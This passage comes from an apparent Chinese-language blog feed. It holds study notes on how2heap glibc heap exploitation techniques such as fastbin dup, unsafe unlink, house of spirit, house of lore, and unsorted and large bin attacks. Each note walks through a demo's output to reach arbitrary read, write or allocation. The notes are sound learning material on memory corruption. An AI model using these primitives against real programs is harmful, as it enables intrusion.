chunk<br>chunk a: <span class="hljs-number">0x209a010</span><br>chunk b: <span class="hljs-number">0x209a030</span><br>chunk c: <span class="hljs-number">0x209a050</span><br>free 掉 chunk a<br>如果还对 <span class="hljs-number">0x209a010</span> 进行 free, 程序会崩溃。因为 <span class="hljs-number">0x209a010</span> 现在是 fastbin 的第一个<br>先对 b <span class="hljs-number">0x209a030</span> 进行 free<br>接下来就可以对 <span class="hljs-number">0x209a010</span> 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了<br>现在 fastbin 的链表是 [ <span class="hljs-number">0x209a010</span>, <span class="hljs-number">0x209a030</span>, <span class="hljs-number">0x209a010</span> ] 接下来通过修改 <span class="hljs-number">0x209a010</span> 上的内容来进行攻击.<br>第一次 malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a010</span><br>第二次 malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a030</span><br>现在 fastbin 表中只剩 [ <span class="hljs-number">0x209a010</span> ] 了<br>接下来往 <span class="hljs-number">0x209a010</span> 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去<br>现在覆盖 <span class="hljs-number">0x209a010</span> 前面的 <span class="hljs-number">8</span> 字节，修改 fd 指针指向 stack_var 前面 <span class="hljs-number">0x20</span> 的位置<br>第三次 malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x209a010</span>, 把栈地址放到 fastbin 链表中<br>这一次 malloc(<span class="hljs-number">8</span>) 就申请到了栈上去: <span class="hljs-number">0x7ffec12adb40</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请3个chunk，p1，p2，p3</li><li>free p1，再freep2，形成 p2 -&gt; p1</li><li>再free p1 形成 p1 -&gt; p2 -&gt; p1</li><li>修改p1的fd指向任意地址，栈上都可</li><li>连续申请三次chunk</li><li>第四次申请chunk会申请到目标地址</li></ul><p><strong>结果</strong></p><p>任意地址读写</p><h2 id="Fastbin-dup-consolidate"><a href="#Fastbin-dup-consolidate" class="headerlink" title="Fastbin_dup_consolidate"></a>Fastbin_dup_consolidate</h2><p><strong>原理</strong></p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">申请两个 fastbin 范围内的 chunk: p1=0xbba010 p2=0xbba030<br>先 free p1<br>去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=0xbba050<br>因为 malloc_consolidate(), p1 会被放到 unsorted bin 中<br>这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成<span class="hljs-built_in"> double </span>free<br>现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0xbba010 0xbba010<br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><pre><code>- 1.free 一个fastbin大小的chunk 1- 2.申请一个largin bin 大小的chunk，此时因为 malloc_consolidate(), chunk1 会被放到 unsorted bin 中- 再次free chunk1</code></pre><p><strong>结果</strong></p><p>​现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0xbba010 0xbba010，任意地址读写</p><h2 id="Unsafe-Unlink"><a href="#Unsafe-Unlink" class="headerlink" title="Unsafe_Unlink"></a>Unsafe_Unlink</h2><p><strong>原理</strong></p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xl">当你在已知位置有指向某个区域的指针时，可以调用 unlink<br>最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针<br>本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入<br><br>全局变量 chunk0_ptr 在 <span class="hljs-number">0</span>x6020d0, 指向 <span class="hljs-number">0</span>x161e010<br>我们想要破坏的 chunk 在 <span class="hljs-number">0</span>x161e0a0<br>在 chunk0 那里伪造一个 chunk<br>我们设置 <span class="hljs-function"><span class="hljs-title">fake</span> chunk 的 'next_free_chunk' (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk = P.<br>我们设置 <span class="hljs-function"><span class="hljs-title">fake</span> chunk 的 'previous_free_chunk' (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd = P.<br>通过上面的设置可以绕过检查: (P-&gt;<span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd != P) == False<br>Fake chunk 的 fd: <span class="hljs-number">0</span>x6020b8<br>Fake chunk 的 bk: <span class="hljs-number">0</span>x6020c0<br><br>现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据<br>通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的<br>如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 <span class="hljs-number">0</span>x90 但现在被改成了 <span class="hljs-number">0</span>x80<br>接下来通过把 chunk1 的 prev_inuse 改成 <span class="hljs-number">0</span> 来把伪造的堆块标记为空闲的堆块<br><br>现在释放掉 chunk1，会触发 unlink，合并两个 free chunk<br>此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置<br>chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。<br>之前的值是: Hello!~<br>新的值是: BBBBAAAA<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><p>​fd = goal - 0x18 </p><p>​bk = goal - 0x10</p><p><strong>结果</strong></p><p>任意地址写</p><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><p><strong>原理</strong></p><figure class="highlight dns"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">这个例子演示了 house of spirit 攻击<br>我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它<br>覆盖一个指向 fastbin 的指针<br>这块区域 (长度为: <span class="hljs-number">80</span>) 包含两个 chunk. 第一个在 <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7268</span> 第二个在 <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e72a8</span>.<br>构造 fake chunk 的 size，要比 chunk 大 <span class="hljs-number">0</span>x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 <span class="hljs-number">0</span><br>next chunk 的大小也要注意，要大于 <span class="hljs-number">0</span>x10 小于 av-&gt;system_mem（<span class="hljs-number">128</span>kb）<br>现在，我们拿伪造的那个 fake chunk 的地址进行 free, <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span>.<br>free!<br>现在 malloc 的时候将会把 <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span> 给返回回来<br>malloc(<span class="hljs-number">0</span>x30): <span class="hljs-number">0</span>x7fff<span class="hljs-number">5f0e7270</span><br>Finish!<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><p>构造fake fastbin chunk，free掉这个chunk，再次申请可以拿回这个chunk</p><p>前提有一个可控的指针</p><p><strong>结果</strong></p><p>任意地址写，前提有可控指针</p><h2 id="Posion-null-byte"><a href="#Posion-null-byte" class="headerlink" title="Posion_null_byte"></a>Posion_null_byte</h2><p><strong>原理</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">当存在 off by null 的时候可以使用该技术<br>申请 <span class="hljs-number">0x100</span> 的 chunk a<br>a 在: <span class="hljs-number">0x1eb2010</span><br>因为我们想要溢出 chunk a，所以需要知道他的实际大小: <span class="hljs-number">0x108</span><br>b: <span class="hljs-number">0x1eb2120</span><br>c: <span class="hljs-number">0x1eb2330</span><br>另外再申请了一个 chunk c：<span class="hljs-number">0x1eb2440</span>，防止 <span class="hljs-built_in">free</span> 的时候与 top chunk 发生合并的情况<br>会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 <span class="hljs-number">0x200</span> 来绕过检查<br>b 的 size: <span class="hljs-number">0x211</span><br>假设我们写 chunk a 的时候多写了一个 <span class="hljs-number">0x00</span> 在 b 的 size 的 p 位上<br>b 现在的 size: <span class="hljs-number">0x200</span><br>c 的 prev_size 是 <span class="hljs-number">0x210</span><br>但他根据 chunk b 的 size 找的时候会找到 b+<span class="hljs-number">0x1f0</span> 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == <span class="hljs-number">0x200</span> == <span class="hljs-number">0x200</span> == prev_size (next_chunk(P))<br>申请一个 <span class="hljs-number">0x100</span> 大小的 b1: <span class="hljs-number">0x1eb2120</span><br>现在我们 <span class="hljs-built_in">malloc</span> 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: <span class="hljs-number">0x210</span><br>但是我们之前写 <span class="hljs-number">0x200</span> 那个地方已经改成了: f0<br>接下来 <span class="hljs-built_in">malloc</span> <span class="hljs-string">'b2'</span>, 作为 <span class="hljs-string">'victim'</span> chunk.<br>b2 申请在: <span class="hljs-number">0x1eb2230</span><br>现在 b2 填充的内容是:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>现在对 b1 和 c 进行 <span class="hljs-built_in">free</span> 因为 c 的 prev_size 是 <span class="hljs-number">0x210</span>，所以会把他俩给合并，但是这时候里面还包含 b2 呐.<br>这时候我们申请一个 <span class="hljs-number">0x300</span> 大小的 chunk 就可以覆盖着 b2 了<br>d 申请到了: <span class="hljs-number">0x1eb2120</span>，我们填充一下 d 为 <span class="hljs-string">"D"</span><br>现在 b2 的内容就是:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请0x100大小的chunk a，0x200大小的chunk b，chunk c 防合并</li><li>free b</li><li>通过off-by-one覆写chunk b的size从0x211-&gt;0x200 </li><li>chunk b中b+0x1f0的位置放prev_size = 0x200 我们将会成功绕过 chunk 的检测 chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))</li><li>申请一个0x100的b1，b1会放到b的位置，c的prev_size仍然是0x210，但是我们之前写 0x200 那个地方已经改成了: f0</li><li>申请b2，作为 ‘victim’ chunk </li><li>free b1 和 c，由于c的prev_size是0x210，会合并b1和c，此时b2仍在</li></ul><p><strong>结果</strong></p><p>在一个大的free堆块中存在一个未被free的堆块</p><h2 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House_of_lore"></a>House_of_lore</h2><p><strong>原理</strong></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">定义了两个数组stack_buffer_1 在 <span class="hljs-number">0x7ffc7a946070</span><br>stack_buffer_2 在 <span class="hljs-number">0x7ffc7a946050</span><br>申请第一块属于 fastbin 的 chunk 在 <span class="hljs-number">0x211c010</span><br>在栈上伪造一块 fake chunk<br>设置 fd 指针指向 victim chunk，来绕过 small <span class="hljs-keyword">bin </span>的检查，这样的话就能把堆栈地址放在到 small <span class="hljs-keyword">bin </span>的列表上<br>设置 stack_buffer_1 的 <span class="hljs-keyword">bk </span>指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small <span class="hljs-keyword">bin </span>corrupted, 返回指向栈上假块的指针另外再分配一块，避免与 top chunk 合并 <span class="hljs-number">0x211c080</span><br>Free victim chunk <span class="hljs-number">0x211c010</span>, 他会被插入到 fastbin 中<br><br>此时 victim chunk 的 fd、<span class="hljs-keyword">bk </span>为零<br>victim-&gt;fd: (nil)<br>victim-&gt;<span class="hljs-keyword">bk: </span>(nil)<br><br>这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small <span class="hljs-keyword">bin </span>中 <span class="hljs-number">0x211c010</span><br>现在 victim chunk 的 fd 和 <span class="hljs-keyword">bk </span>更新为 unsorted <span class="hljs-keyword">bin </span>的地址<br>victim-&gt;fd: <span class="hljs-number">0x7f6610ee7bd8</span><br>victim-&gt;<span class="hljs-keyword">bk: </span><span class="hljs-number">0x7f6610ee7bd8</span><br><br>现在模拟一个可以覆盖 victim 的 <span class="hljs-keyword">bk </span>指针的漏洞，让他的 <span class="hljs-keyword">bk </span>指针指向栈上<br>然后申请跟第一个 chunk 大小一样的 chunk<br>他应该会返回 victim chunk 并且它的 <span class="hljs-keyword">bk </span>为修改掉的 victim 的 <span class="hljs-keyword">bk</span><br><span class="hljs-keyword"></span>最后 malloc 一次会返回 victim-&gt;<span class="hljs-keyword">bk </span>指向的那里<br>p4 = malloc(<span class="hljs-number">100</span>)<br><br>在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 <span class="hljs-number">0x7f6610ee7bd8</span><br><br>p4 在栈上 <span class="hljs-number">0x7ffc7a946080</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>在栈上定义了两个数组 stack1，stack2</li><li>申请了一块 fastbin chunk，在栈上伪造一块 fake chunk，设置stack1 fd -&gt; victim chunk，绕过small bin检查</li><li>设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2 &amp; 设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 </li><li>再分配个chunk，避免和top chunk 合并</li><li>free victim chunk，会被放入fastbin中同时fd、bk为0</li><li>再申请一个large bin chunk触发xx使得victim chunk 进入 unsortedbin</li><li>fd 和 bk 被更新为main_arena_88</li><li>存在一个漏洞可以使得victim的bk -&gt; stack 1</li><li>申请一个大小相同的chunk取出victim chunk,并且它的bk为修改掉的victim的bk</li><li>再次malloc一次会返回 victim -&gt; bk 指向的那里，也就是stack1，stack2 fd 指针也更改main_arena_88</li></ul><p><strong>结果</strong></p><p>任意地址malloc</p><h2 id="Overlapping-chunks"><a href="#Overlapping-chunks" class="headerlink" title="Overlapping_chunks"></a>Overlapping_chunks</h2><p><strong>原理</strong></p><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs smali">这是一个简单的堆块重叠问题，首先申请 3 个 chunk<br>这三个 chunk 分别申请到了:<br>p1：0x2088010<br>p2：0x2088110<br>p3：0x2088210<br>给他们分别填充<span class="hljs-string">"1"</span><span class="hljs-string">"2"</span><span class="hljs-string">"3"</span><br><br>free 掉 p2<br>p2 被放到 unsorted bin 中<br>现在假设有一个堆溢出漏洞，可以覆盖 p2<br>为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块<br>我们将 p2 的大小设置为 385, 这样的话我们就能用 376 大小的空间<br><br>现在让我们分配另一个块，其大小等于块p2注入大小的数据大小<br>malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）<br><br>p4 分配在 0x2088110 到 0x2088288 这一区域<br>p3 从 0x2088210 到 0x2088288<br>p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3<br>这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容<br><br>接下来验证一下，现在 p3 与 p4:<br>p4 = 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222<br>p3 = 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�<br><br>如果我们使用 memset(p4, '4', 376), 将会:<br>p4 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�<br>p3 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�<br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请三个堆块大小为0xf8，0xf8，0x78</li><li>free p2，p2被放到 unsorted bin 中</li><li>假设存在一个堆溢出漏洞，可以覆盖p2</li></ul><p><strong>结果</strong></p><p>堆块重叠</p><h2 id="Overlapping-chunks-2"><a href="#Overlapping-chunks-2" class="headerlink" title="Overlapping_chunks_2"></a>Overlapping_chunks_2</h2><p><strong>原理</strong></p><p><strong>操作</strong></p><p><strong>结果</strong></p><h2 id="Mmap-overlapping-chunks"><a href="#Mmap-overlapping-chunks" class="headerlink" title="Mmap_overlapping_chunks"></a>Mmap_overlapping_chunks</h2><p><strong>原理</strong></p><p><strong>操作</strong></p><p><strong>结果</strong></p><h2 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted_bin_attack"></a>Unsorted_bin_attack</h2><p><strong>原理</strong></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">unsorted <span class="hljs-keyword">bin </span>attack 实现了把一个超级大的数（unsorted <span class="hljs-keyword">bin </span>的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7ffe5b09ba18</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x14fe010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted <span class="hljs-keyword">bin </span>中，同时它的 <span class="hljs-keyword">bk </span>指针为 <span class="hljs-number">0x7efe12f93b78</span><br>现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 <span class="hljs-keyword">bk </span>指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 <span class="hljs-keyword">bk </span>指针:<span class="hljs-number">0x7ffe5b09ba08</span><br><br>再去 malloc 的时候可以发现那里的值已经改变为 unsorted <span class="hljs-keyword">bin </span>的地址<br><span class="hljs-number">0x7ffe5b09ba18</span>: <span class="hljs-number">0x7efe12f93b78</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>申请一个chunk p1 (0x410)，再申请一个chunk p2避免与top chunk 合并</li><li>free p1，p1会被放入 unsorted bin 中，同时fd 和 bk指针为main_arena_88</li><li>假设有个漏洞，可以修改p1的bk指针</li><li>修改 bk -&gt; (goal - 0x10)</li><li>再malloc相同大小的chunk p，goal已经为unsorted bin 的地址</li></ul><p><strong>结果</strong></p><p>修改任意位置为 一个很大的数</p><h2 id="Large-bin-attack"><a href="#Large-bin-attack" class="headerlink" title="Large_bin_attack"></a>Large_bin_attack</h2><p><strong>原理</strong></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数<br><br>先来看一下目标:<br>stack_var1 (<span class="hljs-number">0x7fff83c2e410</span>): <span class="hljs-number">0</span><br>stack_var2 (<span class="hljs-number">0x7fff83c2e418</span>): <span class="hljs-number">0</span><br><br>分配第一个 large chunk: <span class="hljs-number">0x6ac000</span><br>再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了<br><br>申请第二个 large chunk 在: <span class="hljs-number">0x6ac360</span><br>同样在分配一个 fastbin 大小的 chunk 防止合并掉<br><br>最后申请第三个 large chunk 在: <span class="hljs-number">0x6ac7a0</span><br>申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并<br><br>free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ <span class="hljs-number">0x6ac360</span> &lt;--&gt; <span class="hljs-number">0x6ac000</span> ]<br><br>现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ <span class="hljs-number">0x6ac0a0</span> ]<br><br>free 掉第三个，他会被放到 unsorted bin 中: [ <span class="hljs-number">0x6ac7a0</span> &lt;--&gt; <span class="hljs-number">0x6ac0a0</span> ]<br><br>假设有个漏洞，可以覆盖掉第二个 chunk 的 <span class="hljs-string">"size"</span> 以及 <span class="hljs-string">"bk"</span>、<span class="hljs-string">"bk_nextsize"</span> 指针<br>减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-<span class="hljs-number">0x10</span>，bk_nextsize 为 stack_var2-<span class="hljs-number">0x20</span><br><br>再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:<br>stack_var1 (<span class="hljs-number">0x7fff83c2e410</span>): <span class="hljs-number">0x6ac7a0</span><br>stack_var2 (<span class="hljs-number">0x7fff83c2e418</span>): <span class="hljs-number">0x6ac7a0</span><br><br></code></pre></td></tr></tbody></table></figure><p><strong>操作</strong></p><ul><li>分配第一个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并</li><li>分配第二个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并</li><li>分配第三个large bin chunk，再申请一个fast bin chunk 隔绝，避免和下一个large bin chunk合并</li><li>free chunk1 和 chunk2  均被放入unsorted bin 中</li><li>现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中</li><li>free chunk3 放到unsorted bin 中</li><li>存在漏洞，可以覆盖掉第二个chunk 的size bk bk_nextsize</li><li>减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x1</li><li>再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了</li></ul><p><strong>结果</strong></p><p>​栈上地址被覆盖</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;First-fit&quot;&gt;&lt;a href=&quot;#First-fit&quot; class=&quot;headerlink&quot; title=&quot;First fit&quot;&gt;&lt;/a&gt;First fit&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="how2heap" scheme="https://kylinxin.github.io/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>算法与程序设计实验</title>
    <link href="https://kylinxin.github.io/2023/10/31/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/"/>
    <id>https://kylinxin.github.io/2023/10/31/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/</id>
    <published>2023-10-31T15:14:29.000Z</published>
    <updated>2023-11-13T07:35:00.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="算法与程序设计实验"><a href="#算法与程序设计实验" class="headerlink" title="算法与程序设计实验"></a>算法与程序设计实验</h1><p>要求</p><blockquote><p>1.复现代码，写上自己的注释</p><p>2.结果展示</p><p>3.将代码进行修改，bug修改，内容提升</p></blockquote><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="逆序计数"><a href="#逆序计数" class="headerlink" title="逆序计数"></a>逆序计数</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> 